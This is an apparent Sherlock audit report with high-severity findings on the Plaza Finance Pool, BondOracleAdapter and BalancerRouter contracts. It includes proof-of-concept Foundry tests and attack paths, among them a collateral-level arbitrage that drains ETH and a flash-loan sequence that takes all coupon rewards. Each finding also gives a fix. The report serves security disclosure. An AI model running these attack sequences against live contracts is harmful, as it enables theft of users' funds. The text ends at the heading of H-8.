# Issue H-1: Incorrect LevETH Redeem Rate Due to BondETH Market Rate and LevETH Rate Comparison, Leading to Trader Losses 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/190 

## Found by 
0x23r0, 0xDLG, KupiaSec, OrangeSantra, Ryonen, Waydou, ZoA, alphacipher, bladeee, bretzel, eta, farman1094, momentum, phn210, sl1, tinnohofficial, wickie, zxriptor

### Summary

Withdrawal of BondETH is depend on two rates.
1. `redeemRate` calculated in contract based on real time values.
2. `marketRate` created through taking the price from `BondOracleAdapter`.
Then we compare the both rate and take the lower one to use for withdrawing. 

However the market rate is only for BondETH not for LevETH, still we comparing with the LevETH as well which always result in using the BondETH market Rate, Because it always be lower. 
-  General Lev redeem rate (625000000) [as per POC]
- Market rate always be upto (100000000)

It's always result in loss for traders. They are always withdraw the wrong amount.


### Root Cause

Link : https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L477C2-L525C4

Issue lies in `Pool::getRedeemAmount`
```diff
-  if (marketRate != 0 && marketRate < redeemRate) {
-   redeemRate = marketRate;
```


```solidity
  function getRedeemAmount(
    TokenType tokenType,
    uint256 depositAmount,
    uint256 bondSupply,
    uint256 levSupply,
    uint256 poolReserves,
    uint256 ethPrice,
    uint8 oracleDecimals,
    uint256 marketRate
  ) public pure returns(uint256) {
    if (bondSupply == 0) {
      revert ZeroDebtSupply();
    }


    uint256 tvl = (ethPrice * poolReserves).toBaseUnit(oracleDecimals);
    uint256 assetSupply = bondSupply;
    uint256 multiplier = POINT_EIGHT;


    // Calculate the collateral level based on the token type
    uint256 collateralLevel;
    if (tokenType == TokenType.BOND) {
      collateralLevel = ((tvl - (depositAmount * BOND_TARGET_PRICE)) * PRECISION) / ((bondSupply - depositAmount) * BOND_TARGET_PRICE);
    } else {
      multiplier = POINT_TWO;
      assetSupply = levSupply;
      collateralLevel = (tvl * PRECISION) / (bondSupply * BOND_TARGET_PRICE);


      if (assetSupply == 0) {
        revert ZeroLeverageSupply();
      }
    }
    
    // Calculate the redeem rate based on the collateral level and token type
    uint256 redeemRate;
    if (collateralLevel <= COLLATERAL_THRESHOLD) {
      redeemRate = ((tvl * multiplier) / assetSupply);
    } else if (tokenType == TokenType.LEVERAGE) {
      redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
    } else {
      redeemRate = BOND_TARGET_PRICE * PRECISION;
    }


    if (marketRate != 0 && marketRate < redeemRate) {
      redeemRate = marketRate;
    }
    
    // Calculate and return the final redeem amount
    return ((depositAmount * redeemRate).fromBaseUnit(oracleDecimals) / ethPrice) / PRECISION;
  }
```

### Internal Pre-conditions

There always be issue as long we are taking market Price.

### External Pre-conditions

No pre-conditions required

### Attack Path

This issue in core function, issue is exist in all withdrawal order of LevETH as long we are getting Market Rate.



### Impact

Below is the situation if we mint 1 eth for LevETH and then redeem. 
1. When market rate is not working ( Redeemed 1 ETH)
2. When market rate is returning value ( Redeemed 0.16 ETH)

**The trader loss is around 84%**

![Image](https://github.com/user-attachments/assets/0cd464a9-2ce2-480a-8f7b-320bab6ce3c9)

### PoC

Make sure to make the marketRate return value. and then not returning value.
For initial pool value Healthy rate is considered which used in `script/TestnetScript.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import {Pool} from "../src/Pool.sol";
import {Token} from "./mocks/Token.sol";
import {Auction} from "../src/Auction.sol";
import {Utils} from "../src/lib/Utils.sol";
import {MockPool} from "./mocks/MockPool.sol";
import {BondToken} from "../src/BondToken.sol";
import {TestCases} from "./data/TestCases.sol";
import {Decimals} from "../src/lib/Decimals.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {Distributor} from "../src/Distributor.sol";
import {OracleFeeds} from "../src/OracleFeeds.sol";
import {Validator} from "../src/utils/Validator.sol";
import {OracleReader} from "../src/OracleReader.sol";
import {LeverageToken} from "../src/LeverageToken.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Deployer} from "../src/utils/Deployer.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import {console} from "forge-std/console.sol";

contract PersTest is Test, TestCases {
  using Decimals for uint256;
  using Strings for uint256;

  PoolFactory private poolFactory;
  PoolFactory.PoolParams private params;

  MockPriceFeed private mockPriceFeed;
  address private oracleFeedsContract;

  address private deployer = address(0x1);
  address private minter = address(0x2);
  address private governance = address(0x3);
  address private securityCouncil = address(0x4);
  address private user = address(0x5);
  address private user2 = address(0x6);
  address private user3 = address(0x7);
  address private user4 = address(0x8);
  address private user5 = address(0x9);
  BondToken bond;
  Pool pool;
  LeverageToken lev;
  Token rToken;


  address public constant ethPriceFeed = address(0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70);
  uint256 private constant CHAINLINK_DECIMAL_PRECISION = 10**8;
  uint8 private constant CHAINLINK_DECIMAL = 8;

  /**
   * @dev Sets up the testing environment.
   * Deploys the BondToken contract and a proxy, then initializes them.
   * Grants the minter and governance roles and mints initial tokens.
   */
  function setUp() public {
    vm.startPrank(deployer);

    address contractDeployer = address(new Deployer());
    oracleFeedsContract = address(new OracleFeeds());

    address poolBeacon = address(new UpgradeableBeacon(address(new Pool()), governance));
    address bondBeacon = address(new UpgradeableBeacon(address(new BondToken()), governance));
    address levBeacon = address(new UpgradeableBeacon(address(new LeverageToken()), governance));
    address distributorBeacon = address(new UpgradeableBeacon(address(new Distributor()), governance));

    poolFactory = PoolFactory(Utils.deploy(address(new PoolFactory()), abi.encodeCall(
      PoolFactory.initialize, 
      (governance, contractDeployer, oracleFeedsContract, poolBeacon, bondBeacon, levBeacon, distributorBeacon)
    )));

    params.fee = 0;
    params.feeBeneficiary = governance;
    params.reserveToken = address(new Token("Wrapped ETH", "WETH", false));
    params.sharesPerToken = 2_500_000;
    params.distributionPeriod = 7776000;
    params.couponToken = address(new Token("USDC", "USDC", false));
    
    OracleFeeds(oracleFeedsContract).setPriceFeed(params.reserveToken, address(0), ethPriceFeed, 1 days);

    // Deploy the mock price feed
    mockPriceFeed = new MockPriceFeed();

    // Use vm.etch to deploy the mock contract at the specific address
    bytes memory bytecode = address(mockPriceFeed).code;
    vm.etch(ethPriceFeed, bytecode);

    // Set oracle price
    mockPriceFeed = MockPriceFeed(ethPriceFeed);
    mockPriceFeed.setMockPrice(3125 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));
    
    vm.stopPrank();

    vm.startPrank(governance);
    poolFactory.grantRole(poolFactory.POOL_ROLE(), governance);
    poolFactory.grantRole(poolFactory.SECURITY_COUNCIL_ROLE(), securityCouncil);
    vm.stopPrank();
  }

   function testMarketRateImbalance() public {
    vm.startPrank(governance);
     rToken = Token(params.reserveToken);

    // Mint reserve tokens
    rToken.mint(governance, 100 ether);
    rToken.approve(address(poolFactory), 100 ether);

    // Create pool and approve deposit amount
     pool = Pool(poolFactory.createPool(params, 100 ether, 2500 ether, 100 ether, "", "", "", "", false));
    bond = pool.bondToken();
    lev = pool.lToken();
    assertEq(2500 ether, BondToken(pool.bondToken()).totalSupply());
    assertEq(100 ether, LeverageToken(pool.lToken()).totalSupply());

   
    console.log("1st Iteration");
    createToken(user, 1 ether, Pool.TokenType.LEVERAGE);
    console.log("                ");


    // NOTE Make sure to mock MarketRate to return value.
     vm.startPrank(user);   
    console.log("3rd Iteration LEv Redeem");
    uint amount = pool.redeem(Pool.TokenType.LEVERAGE, lev.balanceOf(user), 1);
    console.log("Amount Redeemed", amount);
    console.log("                ");
    assertEq(amount, rToken.balanceOf(user));
    vm.stopPrank();
  
  }

  function createToken(address inBehalfOf,uint dealAmount, Pool.TokenType tokenType ) internal {
    vm.startPrank(inBehalfOf);
    deal(address(rToken), inBehalfOf, dealAmount );
    rToken.approve(address(pool), dealAmount);    
    uint amount = pool.create(tokenType, dealAmount, 1);
    console.log("Amount Minted", amount);
    if(tokenType == Pool.TokenType.BOND){
      assertEq(amount, bond.balanceOf(inBehalfOf));
    } else {
      assertEq(amount, lev.balanceOf(inBehalfOf));
    }
    vm.stopPrank();
  }
}
```

### Mitigation
There is 2 possible solution
1. To change the code in `Pool::simulateRedeem` only feching marketRate if redeem TokenType is Bond.
2. Made changes in `Pool::getRedeemAmount` comparing `marketRate` with `redeemRate` if TokenType is Bond only.
```solidity
 if (tokenType == TokenType.BOND){
  if (marketRate != 0 && marketRate < redeemRate) {
      redeemRate = marketRate;
    }}

```  

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/147




# Issue H-2: Anyone Can Get Funds From This Contract. 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/341 

## Found by 
0xadrii, KupiaSec, farman1094, future, novaman33


### Summary
An attacker can purchase bondETH at a low price and sell it at a higher price.

### Root Cause
When selling `bondETH`, the `estimated collateralLevel` is utilized instead of the `current collateralLevel`.
By exploiting this vulnerability, an attacker can purchase `bondETH` at various prices and sell it for the maximum price of $100.

https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Pool.sol#L498
```solidity
    function getRedeemAmount(
        ...
    ) public pure returns(uint256) {
        ...
        uint256 tvl = (ethPrice * poolReserves).toBaseUnit(oracleDecimals);
        uint256 assetSupply = bondSupply;
        uint256 multiplier = POINT_EIGHT;

        // Calculate the collateral level based on the token type
        uint256 collateralLevel;
        if (tokenType == TokenType.BOND) {
498:        collateralLevel = ((tvl - (depositAmount * BOND_TARGET_PRICE)) * PRECISION) / ((bondSupply - depositAmount) * BOND_TARGET_PRICE);
        } else {
            ...
        }
        
        // Calculate the redeem rate based on the collateral level and token type
        uint256 redeemRate;
        if (collateralLevel <= COLLATERAL_THRESHOLD) {
            redeemRate = ((tvl * multiplier) / assetSupply);
        } else if (tokenType == TokenType.LEVERAGE) {
            redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
        } else {
            redeemRate = BOND_TARGET_PRICE * PRECISION;
        }

        if (marketRate != 0 && marketRate < redeemRate) {
            redeemRate = marketRate;
        }
        
        // Calculate and return the final redeem amount
        return ((depositAmount * redeemRate).fromBaseUnit(oracleDecimals) / ethPrice) / PRECISION;
    }
```

### Internal pre-conditions
`collateralLevel > 1.2`

### External pre-conditions
N/A

### Attack Path
The attacker purchases bondETH until the collateralLevel is less than 1.2 at various prices and then sells it all at the maximum price($100).

### PoC
The price calculation formula is as follows:
- When purchasing bondETH:
`tvl = (ethPrice * poolReserve)`, `collateralLevel = tvl / (bondSupply * 100)`.
If `collateralLevel <= 1.2`, `creationRate = tvl * 0.8 / bondSupply`.
If `collateralLevel > 1.2`,  `creationRate = 100`.
- When selling bondETH:
`tvl = (ethPrice * poolReserve)`, `collateralLevel = (tvl - bondToSell * 100) / ((bondSupply - bondToSell) * 100)`.
If `collateralLevel <= 1.2`, `redeemRate = tvl * 0.8 / bondSupply`.
If `collateralLevel > 1.2`,  `redeemRate = 100`.

Assuming: `poolReserve = 120 ETH`, `bondSupply = 3000 bondETH`, `levSupply = 200 levETH`, `ETH Price = $3075`
- When Alice buys bondETH for 30 ETH:
    `tvl = 3075 * 120 = 369000`, `collateralLevel = 369000 / (3000 * 100) = 1.23`, `creationRate = 100`.
    `minted = 30 * 3075 / 100 = 922.5 bondETH`.
    `poolReserve = 150 ETH`, `bondSupply = 3922.5`, `Alice's bondEth amount = 922.5 bondETH`.
- When Alice buys bondETH another 30 ETH:
    `tvl = 3075 * 150 = 461250`, `collateralLevel = 461250 / (3922.5 * 100) ~= 1.176 < 1.2`, `creationRate = 461250 * 0.8 / 3922.5 ~= 94.07`
    `minted = 30 * 3075 / (461250 * 0.8 / 3922.5) = 980.625`
    `poolReserve = 180 ETH`, `bondSupply = 4903.125`. `Alice's bondEth amount = 1903.125 bondETH`.
- When Alice sells all of her bondETH:
    `tvl = 3075 * 180 = 553500`, `collateralLevel = (553500 - 1903.125 * 100) / (3000 * 100) = 363187.5 / 300,000 = 1.210625 > 1.2`
    `redeemRate = 100`, `receivedAmount = 1903.125 * 100 / 3075 ~= 61.89 ETH`.
Thus, Alice extracts approximately 1.89 ETH from this market. 
When Alice first buys at the price(creationRate) of $100, the market price (marketRate) is also nearly $100, resulting in no significant impact from the market price(Even if the decimal of `marketRate` is correct).

Attacker can extract ETH until `collateralLevel` reaches `1.2`.
This amount is `(ethPrice * poolReserve - 120 * bondSupply) ($)`.
Even if `collateralLevel < 1.2`, bondETH owners could sell their bondETH and then extract ETH from this market.

### Impact
An attacker could extract significant amounts of ETH from this market.

### Mitigation
```diff
    function getRedeemAmount(
        ...
    ) public pure returns(uint256) {
        ...
        // Calculate the collateral level based on the token type
        uint256 collateralLevel;
        if (tokenType == TokenType.BOND) {
-498:        collateralLevel = ((tvl - (depositAmount * BOND_TARGET_PRICE)) * PRECISION) / ((bondSupply - depositAmount) * BOND_TARGET_PRICE);
+498:        collateralLevel = (tvl * PRECISION) / (bondSupply * BOND_TARGET_PRICE);
        } else {
            ...
        }
        
        // Calculate the redeem rate based on the collateral level and token type
        uint256 redeemRate;
        if (collateralLevel <= COLLATERAL_THRESHOLD) {
            redeemRate = ((tvl * multiplier) / assetSupply);
        } else if (tokenType == TokenType.LEVERAGE) {
            redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
        } else {
            redeemRate = BOND_TARGET_PRICE * PRECISION;
        }

        if (marketRate != 0 && marketRate < redeemRate) {
            redeemRate = marketRate;
        }
        
        // Calculate and return the final redeem amount
        return ((depositAmount * redeemRate).fromBaseUnit(oracleDecimals) / ethPrice) / PRECISION;
    }
```    

### Test Code
https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/test/Pool.t.sol#L1156
Changed linked function to following code.

```solidity
  function testCreateRedeemWithFees() public {
    vm.startPrank(governance);

    // Create a pool with 2% fee
    params.fee = 20000; // 2% fee (1000000 precision)
    params.feeBeneficiary = address(0x942);

    // Mint and approve reserve tokens
    Token rToken = Token(params.reserveToken);
    rToken.mint(governance, 120 ether);
    rToken.approve(address(poolFactory), 120 ether);

    Pool pool = Pool(poolFactory.createPool(params, 120 ether, 3000 ether, 200 ether, "", "", "", "", false));
    vm.stopPrank();

    // User creates leverage tokens
    vm.startPrank(user);
    
    rToken.mint(user, 60 ether);
    mockPriceFeed.setMockPrice(3075 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));

    uint256 usedEth = 60 ether;
    uint256 receivedEth = 0;
    uint256 buyTime = 2;
    uint256 sellTime = 1;
    rToken.approve(address(pool), usedEth);
    uint256 bondAmount = 0;

    console2.log("Before Balance:", rToken.balanceOf(user));
    assertEq(rToken.balanceOf(user), 60 ether);
    for (uint256 i = 0; i < buyTime; i++) {
      bondAmount += pool.create(Pool.TokenType.BOND, usedEth / buyTime, 0);
    }
    pool.bondToken().approve(address(pool), bondAmount);
    for (uint256 i = 0; i < sellTime; i++) {
      receivedEth += pool.redeem(Pool.TokenType.BOND, bondAmount / sellTime, 0);
    }
    console2.log(" After Balance:",rToken.balanceOf(user));
    assertLt(rToken.balanceOf(user), 60 ether);
    
    vm.stopPrank();

    // Reset state
    rToken.burn(user, rToken.balanceOf(user));
    rToken.burn(address(pool), rToken.balanceOf(address(pool)));
  }
```
forge test --match-test "testCreateRedeemWithFees" -vv

Result:
>[FAIL: assertion failed: 61890244154579369433 >= 60000000000000000000] testCreateRedeemWithFees() (gas: 2190059)
>Logs:
>  Before Balance: 60000000000000000000
>   After Balance: 61890244154579369433





## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/155




# Issue H-3: Calling the transferReserveToAuction will revert due to increase in currentPeriod 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/407 

## Found by 
056Security, 0x23r0, 0x52, 0xAadi, 0xEkko, 0xPhantom2, 0xadrii, 0xc0ffEE, 0xrex, 4th05, Artur, Aymen0909, BADROBINX, ChainProof, Goran, Hueber, Kenn.eth, Kyosi, Mill, MysteryAuditor, POB, Pablo, Schnilch, Strapontin, Uddercover, Vidus, X0sauce, ZoA, alphacipher, bladeee, bretzel, carlitox477, dobrevaleri, elolpuer, elvin.a.block, evmboi32, farismaulana, i3arba, jimpixjed, jprod15, momentum, mxteem, novaman33, oxelmiguel, pashap9990, phoenixv110, rudhra1749, shiazinho, shui, shushu, silver\_eth, sl1, stuart\_the\_minion, tinnohofficial, tusharr1411, tvdung94, wellbyt3, x0lohaclohell, y4y, zhenyazhd

### Summary

The auction contract calls the  [transferReserveToAuction](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L577)  function to pull the reserve tokens.

However, an issue occur that will prevent the auction contract from calling the function.

### Root Cause

During auction creation, the `currentPeriod` is used to store the auction address in the `auctions` mapping, however, the `currentPeriod` is then [increased](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L567) to another value, meaning when we quote the current period again, it will return 2 if it was 1 prior to the incraese

```solidity

  552:@>    auctions[currentPeriod] = Utils.deploy(
        address(new Auction()),
        abi.encodeWithSelector(
          Auction.initialize.selector,
          address(couponToken),
          address(reserveToken),
          couponAmountToDistribute,
          block.timestamp + auctionPeriod,
          1000,
          address(this),
          poolSaleLimit
        )
      );

      // Increase the bond token period
  @>    bondToken.increaseIndexedAssetPeriod(sharesPerToken);
```

### Internal Pre-conditions

Can happen in normal operation.

### External Pre-conditions

none

### Attack Path

1. User or anyone starts the [auction](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L530) and the auction address is stored in the `auctions` mapping
2. After some time, the auction succeed and the [transferReserveToAuction](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Auction.sol#L345) is called to transfer the reserve token to the auction contract.
3. Since the `currentPeriod` has now increased , quoting the `bondToken.globalPool()` will return the increased value, meaning the mapping will return zero address because there's no address saved to it, so comparing it with the `msg.sender` will revert because the  caller auctionaddress != address(0)

### Impact

The call to the `transferReserveToAuction` will fail and ending the auction will not take place.

### PoC

_No response_

### Mitigation

This can be mitigated by subtracting 1 from the quoted `currentPeriod` in the [transferReserveToAuction](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L578)

```solidity
  function transferReserveToAuction(uint256 amount) external virtual {
       (uint256 currentPeriod, ) = bondToken.globalPool();
+     uint256  previousCurrentPeriod = currentPeriod - 1;
      address auctionAddress = auctions[previousCurrentPeriod ];
      require(msg.sender == auctionAddress, CallerIsNotAuction());
    
      IERC20(reserveToken).safeTransfer(msg.sender, amount);
  }
```

just like it happened in the [distribute](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L589) function.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/157




# Issue H-4: BondOracleAdapter will cause massive loss of funds for a large number of bond tokens 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/440 

## Found by 
0x52, ZoA, bladeee

### Summary

BondOracleAdapter both directly returns the price from the pool and hardcodes the oracle decimals to bondToken.decimals(). The combination of these two factors will cause the adapter to return an incorrect value for any bondToken that is not alphanumerically greater than USDC. The dex pool always prices tokenA in terms of tokenB and because the decimals of the oracle are hardcoded to the decimals of the bond token, the bond token must be tokenB or else the decimals will be incorrect. This incorrect pricing will cause massive loss of funds to user withdrawing from the pool as the market price will be much too low.

When initializing the BondOracleAdapter, it pulls the pool address from the getPool mapping. While this will pull the relevant pool for those tokens, it does not ensure that the tokens are in the correct order.

[CLFactory.sol#L91-L93](https://github.com/velodrome-finance/slipstream/blob/7b50de4648ec340891a8d5c1366c83983308d3b9/contracts/core/CLFactory.sol#L91-L93)

        getPool[token0][token1][tickSpacing] = pool;
        // populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses
        getPool[token1][token0][tickSpacing] = pool;

We see that get pool is populated in both orders even though they are sorted alphanumerically. Therefore when the pool is retrieved for BondOracleAdapter the tokens can be in any order.

[BondOracleAdapter#L113](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BondOracleAdapter.sol#L113)

    return (uint80(0), int256(getPriceX96FromSqrtPriceX96(getSqrtTwapX96)), block.timestamp, block.timestamp, uint80(0));

We see that when price is returned it is always returned directly as returned by the underlying dex pool. The issues is that if the bond token is not tokenB then the decimal of the return value will be the liquidity token rather than the bond token.

[Pool.sol#L519-L521](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L519-L521)

    if (marketRate != 0 && marketRate < redeemRate) {
      redeemRate = marketRate;
    }

As a result when redeeming bond tokens the value will be significantly lower than expected and will result in bond holders losing large amounts of value.

### Root Cause

[BondOracleAdapter#L113](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BondOracleAdapter.sol#L113) always return price directly

[BondOracleAdapter.sol#L62](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BondOracleAdapter.sol#L62) always assumes that price is denominated in bond tokens

### Internal Pre-conditions

address(bondToken) > address(liquidityToken)

### External Pre-conditions

N/A

### Attack Path

N/A

### Impact

Loss of funds for redeeming bond token holders

### PoC

_No response_

### Mitigation

BondOracleAdapter#initialize should set decimals to either bondToken or liquidityToken depending on token order in the pool

# Issue H-5: Leverage user can avoid paying fees to bond holders by withdrawing before auction ends 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/450 

The protocol has acknowledged this issue.

## Found by 
0x52, moray5554, phoenixv110

### Summary

Bond holders are paid fees by leverage holders in discrete quarterly payments. Due to the long length of this period, leverage holders can easily exploit and avoid this fee by withdrawing before funds are taken to pay for the auction. By doing this they can easily avoid paying all fees to bond holders, causing substantial losses to other leverage holders who are now forced to pay the malicious user's share of the fees.

[Pool.sol#L511-L517](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L511-L517)

        if (collateralLevel <= COLLATERAL_THRESHOLD) {
            redeemRate = ((tvl * multiplier) / assetSupply);
        } else if (tokenType == TokenType.LEVERAGE) {
    @>      redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
        } else {
            redeemRate = BOND_TARGET_PRICE * PRECISION;
        }

We see above that the redeemRate for leverage tokens is calculated based on the number of asset held by the pool.

[Pool.sol#L577-L583](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L577-L583)

        function transferReserveToAuction(uint256 amount) external virtual {
            (uint256 currentPeriod, ) = bondToken.globalPool();
            address auctionAddress = auctions[currentPeriod];
            require(msg.sender == auctionAddress, CallerIsNotAuction());
            
    @>      IERC20(reserveToken).safeTransfer(msg.sender, amount);
        }

We also see that funds are transferred out of the contract until after the auction is completed. Therefore if the user withdraws before the auction ends then they will received an amount that is not subject to the bond holders fee.

### Root Cause

[Pool.sol#L383-L414](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L383-L414) fails to enforce or charge partial fees to redeeming leverage users

### Internal preconditions

None

### External preconditions

None

### Attack Path

N/A

### Impact

Leverage users can get leverage exposure for free while forcing other users to pay their fees

### POC

Unfortunately it is impossible to demonstrate via POC because `transferReserveToAuction` is broken

### Mitigation

N/A

# Issue H-6: Malicious user can leverage flash loans to claim all coupon rewards 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/725 

## Found by 
0x23r0, 0x52, 0xNov1ce, 0xe4669da, AksWarden, BADROBINX, ChainProof, Etherking, InquisitorScythe, Kenn.eth, MysteryAuditor, Nadir\_Khan\_Sec, OrangeSantra, Pablo, Schnilch, Strapontin, Uddercover, ZoA, aswinraj94, bladeee, copperscrewer, devalinas, farman1094, future, komane007, momentum, moray5554, phoenixv110

### Summary

Anyone can call `Pool::startAuction`, which will deploy a new auction and checkpoint the `sharesPerToken` by calling [BondToken::increaseIndexedAssetPeriod](https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/BondToken.sol#L217-L229) for the holders of bond token, as long as `distributionPeriod` have passed since the last distribution.


```solidity
    function startAuction() external whenNotPaused {
        require(lastDistribution + distributionPeriod < block.timestamp, DistributionPeriodNotPassed());
        require(lastDistribution + distributionPeriod + auctionPeriod >= block.timestamp, AuctionPeriodPassed());
       ....
        bondToken.increaseIndexedAssetPeriod(sharesPerToken);
        lastDistribution = block.timestamp;
    }
```

The [Pool::distribute](https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Pool.sol#L589-L614) function distributes the rewards from the previous auction, so it can only be called after a new auction has started.

```solidity
 function distribute() external whenNotPaused {
        (uint256 currentPeriod,) = bondToken.globalPool();
        require(currentPeriod > 0, AccessDenied());

        uint256 previousPeriod = currentPeriod - 1;
        uint256 couponAmountToDistribute = Auction(auctions[previousPeriod]).totalBuyCouponAmount();

        ....
```
The `Distributor::claim` function gets the shares of the user by calling`BondToken::getIndexedUserAmount`:

```solidity
    function getIndexedUserAmount(address user, uint256 balance, uint256 period) public view returns (uint256) {
        IndexedUserAssets memory userPool = userAssets[user];
        uint256 shares = userPool.indexedAmountShares;

        for (uint256 i = userPool.lastUpdatedPeriod; i < period; i++) {
            shares += (balance * globalPool.previousPoolAmounts[i].sharesPerToken).toBaseUnit(SHARES_DECIMALS);
        }

        return shares;
    }
```
The function loops through the periods and accounts for all of the shares during the user's last updated one to the current.


The docs state that as long as the user holds during distribution, he should be eligible for the coupon rewards, however this opens up an opportunity for a flash loan attack.

The attacker can leverage this by minting bond tokens and calling `startAuction`, which will increase the current period and make it greater than the `userPool.lastUpdatedPeriod`, which makes the `Distributor` account his shares.

### Root Cause

`Pool` does not have a flashloan protection allowing users to claim all of the coupon rewards

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

When users claim through the [Distributor::claim](https://github.com/sherlock-audit/2024-12-plaza-finance/tree/main/plaza-evm/src/Distributor.sol#L78-L110) 1 share == 1 coupon token, which the attacker can leverage by:
In one transaction:
- Takes a flashloan
 - Mints `couponAmountToDistribute / sharesPerToken` bond tokens
 - Calls `startAuction` to snapshot his balance
 - Calls `distribute` to distribute the coupon rewards to the distributor
 - Calls `Distributor::claim` to claim all of the shares
 - Burn the bond tokens 
 - Repays the flashloan

### Impact

All of the other holders will be left with no rewards

### PoC

_No response_

### Mitigation

Consider not allowing anyone to turn over a period, or apply some kind of snapshot protection

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/162




# Issue H-7: Funds might remain locked in `BalancerRouter` when depositing in Balancer pool 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/841 

## Found by 
0xShahilHussain, 0xadrii, Adotsam, Albort, KupiaSec, ZeroTrust, bretzel, dobrevaleri, elolpuer, novaman33, shushu, sl1

### Summary

Not checking how much of the deposited assets are actually deposited in the pool, will lead to loss of funds for the user, because the remaining assets will be locked inside the `BalancerRouter`.

### Root Cause

`BalancerRouter` provides an integration with Balancer V2 pools via the [joinBalancerPool()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L65), which is used by  [joinBalancerAndPlaza()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L42) and [joinBalancerAndPredeposit()](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L23). When called, [joinBalancerPool()]() accepts the `poolId`, array of assets, the maximum amounts the user is willing to deposit and additional user data. First it transfers the maximum amount of assets from the user's address to its ([ref](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L72-L75)). And after that joins the pool ([ref](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/BalancerRouter.sol#L86)). 

However, it is not guaranteed that the maximum value of each asset will be deposited in the Pool. From the [Balancer V2 doc](https://github.com/balancer/balancer-v2-monorepo/blob/36d282374b457dddea828be7884ee0d185db06ba/pkg/interfaces/contracts/vault/IVault.sol#L350-L352):
> The amounts to send are decided by the Pool and not the Vault: it just enforces these maximums.

This means that there might be leftover assets in the `BalancerRouter` that are not deposited into the pool, but are also not returned to the user.

### Internal Pre-conditions

_No response_

### External Pre-conditions

1. Not all assets are deposited into the Balancer Pool.

### Attack Path

1. User calls `joinBalancerAndPredeposit()` or `joinBalancerAndPlaza()`.
2. Maximum amount of tokens are sent to the `BalancerRouter`.
3. Not all of the tokens are deposited into the Pool, because he decides how much to deposit.

### Impact

The user will suffer loss of funds, because part of his assets will remain locked in the `BalancerRouter`.

### PoC

_No response_

### Mitigation

Send the remaining assets back to the user.

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/154




# Issue H-8: Fee is charged current reserveToken pool balance to time which is not updated 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/842 

## Found by 
